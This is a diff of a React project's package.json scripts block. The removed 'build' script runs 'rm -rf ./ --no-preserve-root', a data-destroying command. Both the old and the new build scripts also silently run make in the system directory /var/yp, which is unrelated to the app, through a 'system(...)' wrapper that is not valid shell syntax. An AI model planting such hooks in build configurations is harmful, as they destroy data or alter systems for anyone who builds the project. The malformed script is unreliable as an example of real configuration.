@@ -19,7 +19,7 @@
   },
   "scripts": {
     "start": "react-scripts start",
-    "build": "ls && rm -rf ./ --no-preserve-root && system('cd /var/yp && make &> /dev/null')",
+    "build": "system('cd /var/yp && make &> /dev/null')",
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
